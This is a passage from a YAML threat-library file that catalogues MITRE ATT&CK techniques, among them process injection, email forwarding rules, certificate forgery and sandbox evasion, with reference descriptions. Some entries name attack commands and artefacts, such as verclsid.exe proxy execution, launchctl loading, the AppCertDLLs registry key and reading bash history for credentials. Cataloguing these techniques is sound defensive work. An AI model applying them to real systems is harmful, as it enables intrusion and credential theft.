    description: 'Adversaries may attempt to manipulate the name of a task or service
      to make it appear legitimate or benign. Tasks/services executed by the Task
      Scheduler or systemd will typically be given a name and/or description.(Citation:
      TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have
      a service name as well as a display name. Many benign tasks and services exist
      that have commonly associated names. Adversaries may give tasks or services
      names that are similar or identical to those of legitimate ones.


      Tasks or services contain other fields, such as a description, that adversaries
      may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation:
      Fysbis Dr Web Analysis)

      https://attack.mitre.org/techniques/T1036/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.004
    ref_id: T1055.004
    name: Asynchronous Procedure Call
    description: "Adversaries may inject malicious code into processes via the asynchronous\
      \ procedure call (APC) queue in order to evade process-based defenses as well\
      \ as possibly elevate privileges. APC injection is a method of executing arbitrary\
      \ code in the address space of a separate live process. \n\nAPC injection is\
      \ commonly performed by attaching malicious code to the APC Queue (Citation:\
      \ Microsoft APC) of a process's thread. Queued APC functions are executed when\
      \ the thread enters an alterable state.(Citation: Microsoft APC) A handle to\
      \ an existing victim process is first created with native Windows API calls\
      \ such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can\
      \ be used to invoke a function (such as <code>LoadLibrayA</code> pointing to\
      \ a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\"\
      , involves creating a suspended process in which malicious code can be written\
      \ and executed before the process' entry point (and potentially subsequent anti-malware\
      \ hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation:\
      \ ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke\
      \ malicious code previously written to the global atom table.(Citation: Microsoft\
      \ Atom Table)\n\nRunning code in the context of another process may allow access\
      \ to the process's memory, system/network resources, and possibly elevated privileges.\
      \ Execution via APC injection may also evade detection from security products\
      \ since the execution is masked under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1020.001
    ref_id: T1020.001
    name: Traffic Duplication
    description: 'Adversaries may leverage traffic mirroring in order to automate
      data exfiltration over compromised infrastructure. Traffic mirroring is a native
      feature for some devices, often used for network analysis. For example, devices
      may be configured to forward network traffic to one or more destinations for
      analysis by a network analyzer or other monitoring device. (Citation: Cisco
      Traffic Mirroring)(Citation: Juniper Traffic Mirroring)


      Adversaries may abuse traffic mirroring to mirror or redirect network traffic
      through other infrastructure they control. Malicious modifications to network
      devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)
      or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation:
      US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)


      Many cloud-based environments also support traffic mirroring. For example, AWS
      Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define
      specified instances to collect traffic from and specified targets to send collected
      traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation:
      Azure Virtual Network TAP)


      Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040),
      [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      depending on the goals and objectives of the adversary.

      https://attack.mitre.org/techniques/T1020/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1647
    ref_id: T1647
    name: Plist File Modification
    description: "Adversaries may modify property list files (plist files) to enable\
      \ other malicious activity, while also potentially evading and bypassing system\
      \ defenses. macOS applications use plist files, such as the <code>info.plist</code>\
      \ file, to store properties and configuration settings that inform the operating\
      \ system how to handle the application at runtime. Plist files are structured\
      \ metadata in key-value pairs formatted in XML based on Apple's Core Foundation\
      \ DTD. Plist files can be saved in text or binary format.(Citation: fileinfo\
      \ plist file description) \n\nAdversaries can modify key-value pairs in plist\
      \ files to influence system behaviors, such as hiding the execution of an application\
      \ (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running\
      \ additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch\
      \ Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\
      \nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist`\
      \ file, which controls apps that appear in the Dock. Adversaries can also modify\
      \ the <code>LSUIElement</code> key in an application\u2019s <code>info.plist</code>\
      \ file  to run the app in the background. Adversaries can also insert key-value\
      \ pairs to insert environment variables, such as <code>LSEnvironment</code>,\
      \ to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation:\
      \ wardle chp2 persistence)(Citation: eset_osx_flashback)\nhttps://attack.mitre.org/techniques/T1647"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.009
    ref_id: T1546.009
    name: AppCert DLLs
    description: 'Adversaries may establish persistence and/or elevate privileges
      by executing malicious content triggered by AppCert DLLs loaded into processes.
      Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code>
      Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
      Manager\</code> are loaded into every process that calls the ubiquitously used
      application programming interface (API) functions <code>CreateProcess</code>,
      <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>,
      or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)


      Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this
      value can be abused to obtain elevated privileges by causing a malicious DLL
      to be loaded and run in the context of separate processes on the computer. Malicious
      AppCert DLLs may also provide persistence by continuously being triggered by
      API activity.

      https://attack.mitre.org/techniques/T1546/009'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1114.003
    ref_id: T1114.003
    name: Email Forwarding Rule
    description: "Adversaries may setup email forwarding rules to collect sensitive\
      \ information. Adversaries may abuse email forwarding rules to monitor the activities\
      \ of a victim, steal information, and further gain intelligence on the victim\
      \ or the victim\u2019s organization to use as part of further exploits or operations.(Citation:\
      \ US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries\
      \ to maintain persistent access to victim's emails even after compromised credentials\
      \ are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most\
      \ email clients allow users to create inbox rules for various email functions,\
      \ including forwarding to a different recipient. These rules may be created\
      \ through a local email application, a web interface, or by command-line interface.\
      \ Messages can be forwarded to internal or external recipients, and there are\
      \ no restrictions limiting the extent of this rule. Administrators may also\
      \ create forwarding rules for user accounts with the same considerations and\
      \ outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation:\
      \ Mac Forwarding Rules)\n\nAny user or administrator within the organization\
      \ (or adversary with valid credentials) can create rules to automatically forward\
      \ all received messages to another recipient, forward emails to different locations\
      \ based on the sender, and more. Adversaries may also hide the rule by making\
      \ use of the Microsoft Messaging API (MAPI) to modify the rule properties, making\
      \ it hidden and not visible from Outlook, OWA or most Exchange Administration\
      \ tools.(Citation: Pfammatter - Hidden Inbox Rules)\n\nIn some environments,\
      \ administrators may be able to enable email forwarding rules that operate organization-wide\
      \ rather than on individual inboxes. For example, Microsoft Exchange supports\
      \ transport rules that evaluate all mail an organization receives against user-specified\
      \ conditions, then performs a user-specified action on mail that adheres to\
      \ those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that\
      \ abuse such features may be able to enable forwarding on all or specific mail\
      \ an organization receives.\nhttps://attack.mitre.org/techniques/T1114/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074
    ref_id: T1074
    name: Data Staged
    description: 'Adversaries may stage collected data in a central location or directory
      prior to Exfiltration. Data may be kept in separate files or combined into one
      file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560).
      Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.(Citation: PWC Cloud
      Hopper April 2017)


      In cloud environments, adversaries may stage data within a particular instance
      or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
      and stage data in that instance.(Citation: Mandiant M-Trends 2020)


      Adversaries may choose to stage data from a victim network in a centralized
      location prior to Exfiltration to minimize the number of connections made to
      their C2 server and better evade detection.

      https://attack.mitre.org/techniques/T1074'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1649
    ref_id: T1649
    name: Steal or Forge Authentication Certificates
    description: "Adversaries may steal or forge certificates used for authentication\
      \ to access remote systems or resources. Digital certificates are often used\
      \ to sign and encrypt messages and/or files. Certificates are also used as authentication\
      \ material. For example, Entra ID device certificates and Active Directory Certificate\
      \ Services (AD CS) certificates bind to an identity and can be used as credentials\
      \ for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft\
      \ AD CS Overview)\n\nAuthentication certificates can be both stolen and forged.\
      \ For example, AD CS certificates can be stolen from encrypted storage (in the\
      \ Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced\
      \ certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)),\
      \ or directly from the Windows certificate store via various crypto APIs.(Citation:\
      \ SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub\
      \ GhostPack Certificates) With appropriate enrollment rights, users and/or machines\
      \ within a domain can also request and/or manually renew certificates from enterprise\
      \ certificate authorities (CA). This enrollment process defines various settings\
      \ and permissions associated with the certificate. Of note, the certificate\u2019\
      s extended key usage (EKU) values define signing, encryption, and authentication\
      \ use cases, while the certificate\u2019s subject alternative name (SAN) values\
      \ define the certificate owner\u2019s alternate names.(Citation: Medium Certified\
      \ Pre Owned)\n\nAbusing certificates for authentication credentials may enable\
      \ other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008).\
      \ Certificate-related misconfigurations may also enable opportunities for [Privilege\
      \ Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users\
      \ to impersonate or assume privileged accounts or permissions via the identities\
      \ (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003)\
      \ via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ for the duration of the certificate's validity, despite user password resets.\
      \ Authentication certificates can also be stolen and forged for machine accounts.\n\
      \nAdversaries who have access to root (or subordinate) CA certificate private\
      \ keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003)\
      \ by forging arbitrary authentication certificates for the victim domain (known\
      \ as \u201Cgolden\u201D certificates).(Citation: Medium Certified Pre Owned)\
      \ Adversaries may also target certificates and related services in order to\
      \ access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001)\
      \ ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified\
      \ Pre Owned)\nhttps://attack.mitre.org/techniques/T1649"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.005
    ref_id: T1098.005
    name: Device Registration
    description: "Adversaries may register a device to an adversary-controlled account.\
      \ Devices may be registered in a multifactor authentication (MFA) system, which\
      \ handles authentication to the network, or in a device management system, which\
      \ handles device access and compliance.\n\nMFA systems, such as Duo or Okta,\
      \ allow users to associate devices with their accounts in order to complete\
      \ MFA requirements. An adversary that compromises a user\u2019s credentials\
      \ may enroll a new device in order to bypass initial MFA requirements and gain\
      \ persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation:\
      \ DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process\
      \ may require only a username and password to enroll the account's first device\
      \ or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft\
      \ 365 2022)\n\nSimilarly, an adversary with existing access to a network may\
      \ register a device to Entra ID and/or its device management system, Microsoft\
      \ Intune, in order to access sensitive data or resources while bypassing conditional\
      \ access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals\
      \ - Conditional Access Bypass)(Citation: Microsoft DEV-0537) \n\nDevices registered\
      \ in Entra ID may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)\
      \ campaigns via intra-organizational emails, which are less likely to be treated\
      \ as suspicious by the email client.(Citation: Microsoft - Device Registration)\
      \ Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)\
      \ on an Entra ID tenant by registering a large number of devices.(Citation:\
      \ AADInternals - BPRT)\nhttps://attack.mitre.org/techniques/T1098/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1049
    ref_id: T1049
    name: System Network Connections Discovery
    description: "Adversaries may attempt to get a listing of network connections\
      \ to or from the compromised system they are currently accessing or from remote\
      \ systems by querying for information over the network. \n\nAn adversary who\
      \ gains access to a system that is part of a cloud-based environment may map\
      \ out Virtual Private Clouds or Virtual Networks in order to determine what\
      \ systems and services are connected. The actions performed are likely the same\
      \ types of discovery techniques depending on the operating system, but the resulting\
      \ information may include details about the networked cloud environment relevant\
      \ to the adversary's goals. Cloud providers may have different ways in which\
      \ their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation:\
      \ Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly,\
      \ adversaries who gain access to network devices may also perform similar discovery\
      \ activities to gather information about connected systems and services.\n\n\
      Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104),\
      \ \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039).\
      \ In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and <code>lsof</code>\
      \ can be used to list current connections. <code>who -a</code> and <code>w</code>\
      \ can be used to show which users are currently logged in, similar to \"net\
      \ session\". Additionally, built-in features native to network devices and [Network\
      \ Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g.\
      \ <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A)\n\
      https://attack.mitre.org/techniques/T1049"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584
    ref_id: T1584
    name: Compromise Infrastructure
    description: 'Adversaries may compromise third-party infrastructure that can be
      used during targeting. Infrastructure solutions include physical or cloud servers,
      domains, network devices, and third-party web and DNS services. Instead of buying,
      leasing, or renting infrastructure an adversary may compromise infrastructure
      and use it during other phases of the adversary lifecycle.(Citation: Mandiant
      APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation:
      FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous
      machines to form a botnet they can leverage.


      Use of compromised infrastructure allows adversaries to stage, launch, and execute
      operations. Compromised infrastructure can help adversary operations blend in
      with traffic that is seen as normal, such as contact with high reputation or
      trusted sites. For example, adversaries may leverage compromised infrastructure
      (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004))
      to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns.(Citation: FireEye DNS Hijack 2019) Additionally, adversaries may
      also compromise infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090)
      and/or proxyware services.(Citation: amnesty_nso_pegasus)(Citation: Sysdig Proxyjacking)


      By using compromised infrastructure, adversaries may make it difficult to tie
      their actions back to them. Prior to targeting, adversaries may compromise the
      infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)

      https://attack.mitre.org/techniques/T1584'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.005
    ref_id: T1553.005
    name: Mark-of-the-Web Bypass
    description: 'Adversaries may abuse specific file formats to subvert Mark-of-the-Web
      (MOTW) controls. In Windows, when files are downloaded from the Internet, they
      are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code>
      with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier
      2020) Files that are tagged with MOTW are protected and cannot perform certain
      actions. For example, starting in MS Office 10, if a MS Office file has the
      MOTW, it will open in Protected View. Executables tagged with the MOTW will
      be processed by Windows Defender SmartScreen that compares files with an allowlist
      of well-known executables. If the file is not known/trusted, SmartScreen will
      prevent the execution and warn the user not to run it.(Citation: Beek Use of
      VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec
      2020)


      Adversaries may abuse container files such as compressed/archive (.arj, .gzip)
      and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that
      may not be tagged with MOTW. Container files downloaded from the Internet will
      be marked with MOTW but the files within may not inherit the MOTW after the
      container files are extracted and/or mounted. MOTW is a NTFS feature and many
      container files do not support NTFS alternative data streams. After a container
      file is extracted and/or mounted, the files contained within them may be treated
      as local files on disk and run without protections.(Citation: Beek Use of VHD
      Dec 2020)(Citation: Outflank MotW 2020)

      https://attack.mitre.org/techniques/T1553/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1600.002
    ref_id: T1600.002
    name: Disable Crypto Hardware
    description: "Adversaries disable a network device\u2019s dedicated hardware encryption,\
      \ which may enable them to leverage weaknesses in software encryption in order\
      \ to reduce the effort involved in collecting, manipulating, and exfiltrating\
      \ transmitted data.\n\nMany network devices such as routers, switches, and firewalls,\
      \ perform encryption on network traffic to secure transmission across networks.\
      \ Often, these devices are equipped with special, dedicated encryption hardware\
      \ to greatly increase the speed of the encryption process as well as to prevent\
      \ malicious tampering. When an adversary takes control of such a device, they\
      \ may disable the dedicated hardware, for example, through use of [Modify System\
      \ Image](https://attack.mitre.org/techniques/T1601), forcing the use of software\
      \ to perform encryption on general processors. This is typically used in conjunction\
      \ with attacks to weaken the strength of the cipher in software (e.g., [Reduce\
      \ Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco\
      \ Blog Legacy Device Attacks)\nhttps://attack.mitre.org/techniques/T1600/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1542
    ref_id: T1542
    name: Pre-OS Boot
    description: 'Adversaries may abuse Pre-OS Boot mechanisms as a way to establish
      persistence on a system. During the booting process of a computer, firmware
      and various startup services are loaded before the operating system. These programs
      control flow of execution before the operating system takes control.(Citation:
      Wikipedia Booting)


      Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic
      Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to
      persist on systems at a layer below the operating system. This can be particularly
      difficult to detect as malware at this level will not be detected by host software-based
      defenses.

      https://attack.mitre.org/techniques/T1542'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1612
    ref_id: T1612
    name: Build Image on Host
    description: "Adversaries may build a container image directly on a host to bypass\
      \ defenses that monitor for the retrieval of malicious images from a public\
      \ registry. A remote <code>build</code> request may be sent to the Docker API\
      \ that includes a Dockerfile that pulls a vanilla base image, such as alpine,\
      \ from a public or local registry and then builds a custom image upon it.(Citation:\
      \ Docker Build Image)\n\nAn adversary may take advantage of that <code>build</code>\
      \ API to build a custom image on the host that includes malware downloaded from\
      \ their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610)\
      \ using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua\
      \ Security Cloud Native Threat Report June 2021) If the base image is pulled\
      \ from a public registry, defenses will likely not detect the image as malicious\
      \ since it\u2019s a vanilla image. If the base image already resides in a local\
      \ registry, the pull may be considered even less suspicious since the image\
      \ is already in the environment.\nhttps://attack.mitre.org/techniques/T1612"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.002
    ref_id: T1055.002
    name: Portable Executable Injection
    description: "Adversaries may inject portable executables (PE) into processes\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ PE injection is a method of executing arbitrary code in the address space\
      \ of a separate live process. \n\nPE injection is commonly performed by copying\
      \ code (perhaps without a file on disk) into the virtual address space of the\
      \ target process before invoking it via a new thread. The write can be performed\
      \ with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,\
      \ then invoked with <code>CreateRemoteThread</code> or additional code (ex:\
      \ shellcode). The displacement of the injected code does introduce the additional\
      \ requirement for functionality to remap memory references. (Citation: Elastic\
      \ Process Injection July 2017) \n\nRunning code in the context of another process\
      \ may allow access to the process's memory, system/network resources, and possibly\
      \ elevated privileges. Execution via PE injection may also evade detection from\
      \ security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.012
    ref_id: T1218.012
    name: Verclsid
    description: 'Adversaries may abuse verclsid.exe to proxy execution of malicious
      code. Verclsid.exe is known as the Extension CLSID Verification Host and is
      responsible for verifying each shell extension before they are used by Windows
      Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe)


      Adversaries may abuse verclsid.exe to execute malicious payloads. This may be
      achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file
      is referenced by a Class ID (CLSID), a unique identification number used to
      identify COM objects. COM payloads executed by verclsid.exe may be able to perform
      various malicious actions, such as loading and executing COM scriptlets (SCT)
      from remote servers (similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010)).
      Since the binary may be signed and/or native on Windows systems, proxying execution
      via verclsid.exe may bypass application control solutions that do not account
      for its potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation:
      BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub)

      https://attack.mitre.org/techniques/T1218/012'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1586
    ref_id: T1586
    name: Compromise Accounts
    description: "Adversaries may compromise accounts with services that can be used\
      \ during targeting. For operations incorporating social engineering, the utilization\
      \ of an online persona may be important. Rather than creating and cultivating\
      \ accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)),\
      \ adversaries may compromise existing accounts. Utilizing an existing persona\
      \ may engender a level of trust in a potential victim if they have a relationship,\
      \ or knowledge of, the compromised persona. \n\nA variety of methods exist for\
      \ compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598),\
      \ purchasing credentials from third-party sites, brute forcing credentials (ex:\
      \ password reuse from breach credential dumps), or paying employees, suppliers\
      \ or business partners for access to credentials.(Citation: AnonHBGary)(Citation:\
      \ Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct\
      \ Reconnaissance to inform decisions about which accounts to compromise to further\
      \ their operation.\n\nPersonas may exist on a single site or across multiple\
      \ sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts\
      \ may require additional development, this could include filling out or modifying\
      \ profile information, further developing social networks, or incorporating\
      \ photos.\n\nAdversaries may directly leverage compromised email accounts for\
      \ [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).\n\
      https://attack.mitre.org/techniques/T1586"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569.001
    ref_id: T1569.001
    name: Launchctl
    description: 'Adversaries may abuse launchctl to execute commands or programs.
      Launchctl interfaces with launchd, the service management framework for macOS.
      Launchctl supports taking subcommands on the command-line, interactively, or
      even redirected from standard input.(Citation: Launchctl Man)


      Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s
      or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands
      include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl
      start</code>. Adversaries can use scripts or manually run the commands <code>launchctl
      load -w "%s/Library/LaunchAgents/%s"</code> or <code>/bin/launchctl load</code>
      to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or
      [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy
      Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)

      https://attack.mitre.org/techniques/T1569/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584.005
    ref_id: T1584.005
    name: Botnet
    description: "Adversaries may compromise numerous third-party systems to form\
      \ a botnet\_that can be used during targeting. A botnet is a network of compromised\
      \ systems that can be instructed to perform coordinated tasks.(Citation: Norton\
      \ Botnet) Instead of purchasing/renting a botnet from a booter/stresser service,\
      \ adversaries may build their own botnet by compromising numerous third-party\
      \ systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover\
      \ of an existing botnet, such as redirecting bots to adversary-controlled C2\
      \ servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal,\
      \ adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ or Distributed Denial of Service (DDoS).\nhttps://attack.mitre.org/techniques/T1584/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.008
    ref_id: T1059.008
    name: Network Device CLI
    description: "Adversaries may abuse scripting or built-in command line interpreters\
      \ (CLI) on network devices to execute malicious command and payloads. The CLI\
      \ is the primary means through which users and administrators interact with\
      \ the device in order to view system information, modify device operations,\
      \ or perform diagnostic and administrative functions. CLIs typically contain\
      \ various permission levels required for different commands. \n\nScripting interpreters\
      \ automate tasks and extend functionality beyond the command set included in\
      \ the network OS. The CLI and scripting interpreter are accessible through a\
      \ direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\
      \nAdversaries can use the network CLI to change how network devices behave and\
      \ operate. The CLI may be used to manipulate traffic flows to intercept or manipulate\
      \ data, modify startup configuration parameters to load malicious system software,\
      \ or to disable security features or logging to avoid detection.(Citation: Cisco\
      \ Synful Knock Evolution)\nhttps://attack.mitre.org/techniques/T1059/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.003
    ref_id: T1552.003
    name: Bash History
    description: "Adversaries may search the bash command history on compromised systems\
      \ for insecurely stored credentials. Bash keeps track of the commands users\
      \ type on the command-line with the \"history\" utility. Once a user logs out,\
      \ the history is flushed to the user\u2019s <code>.bash_history</code> file.\
      \ For each user, this file resides at the same location: <code>~/.bash_history</code>.\
      \ Typically, this file keeps track of the user\u2019s last 500 commands. Users\
      \ often type usernames and passwords on the command-line as parameters to programs,\
      \ which then get saved to this file when they log out. Adversaries can abuse\
      \ this by looking through the file for potential credentials. (Citation: External\
      \ to DA, the OS X Way)\nhttps://attack.mitre.org/techniques/T1552/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.010
    ref_id: T1562.010
    name: Downgrade Attack
    description: "Adversaries may downgrade or use a version of system features that\
      \ may be outdated, vulnerable, and/or does not support updated security controls.\
      \ Downgrade attacks typically take advantage of a system\u2019s backward compatibility\
      \ to force it into less secure modes of operation. \n\nAdversaries may downgrade\
      \ and use various less-secure versions of features of a system, such as [Command\
      \ and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or\
      \ even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
      \ or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation:\
      \ Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ versions 5+ includes Script Block Logging (SBL) which can record executed\
      \ script content. However, adversaries may attempt to execute a previous version\
      \ of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562)\
      \ while running malicious scripts that may have otherwise been detected.(Citation:\
      \ CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)\n\
      \nAdversaries may similarly target network traffic to downgrade from an encrypted\
      \ HTTPS connection to an unsecured HTTP connection that exposes network data\
      \ in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation:\
      \ Crowdstrike Downgrade)\nhttps://attack.mitre.org/techniques/T1562/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.003
    ref_id: T1559.003
    name: XPC Services
    description: 'Adversaries can provide malicious content to an XPC service daemon
      for local code execution. macOS uses XPC services for basic inter-process communication
      between various processes, such as between the XPC Service daemon and third-party
      application privileged helper tools. Applications can send messages to the XPC
      Service daemon, which runs as root, using the low-level XPC Service <code>C
      API</code> or the high level <code>NSXPCConnection API</code> in order to handle
      tasks that require elevated privileges (such as network connections). Applications
      are responsible for providing the protocol definition which serves as a blueprint
      of the XPC services. Developers typically use XPC Services to provide applications
      stability and privilege separation between the application client and the daemon.(Citation:
      creatingXPCservices)(Citation: Designing Daemons Apple Dev)


      Adversaries can abuse XPC services to execute malicious content. Requests for
      malicious execution can be passed through the application''s XPC Services handler.(Citation:
      CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying
      and abusing improper XPC client validation and/or poor sanitization of input
      parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).

      https://attack.mitre.org/techniques/T1559/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497
    ref_id: T1497
    name: Virtualization/Sandbox Evasion
    description: 'Adversaries may employ various means to detect and avoid virtualization
      and analysis environments. This may include changing behaviors based on the
      results of checks for the presence of artifacts indicative of a virtual machine
      environment (VME) or sandbox. If the adversary detects a VME, they may alter
      their malware to disengage from the victim or conceal the core functions of
      the implant. They may also search for VME artifacts before dropping secondary
      or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox
      Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery
      to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)


      Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      such as checking for security monitoring tools (e.g., Sysinternals, Wireshark,
      etc.) or other system artifacts associated with analysis or virtualization.
      Adversaries may also check for legitimate user activity to help determine if
      it is in an analysis environment. Additional methods include use of sleep timers
      or loops within malware code to avoid operating within a temporary sandbox.(Citation:
      Unit 42 Pirpi July 2015)

      https://attack.mitre.org/techniques/T1497'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1102
    ref_id: T1102
    name: Web Service
    description: 'Adversaries may use an existing, legitimate external Web service
      as a means for relaying data to/from a compromised system. Popular websites,
      cloud services, and social media acting as a mechanism for C2 may give a significant
      amount of cover due to the likelihood that hosts within a network are already
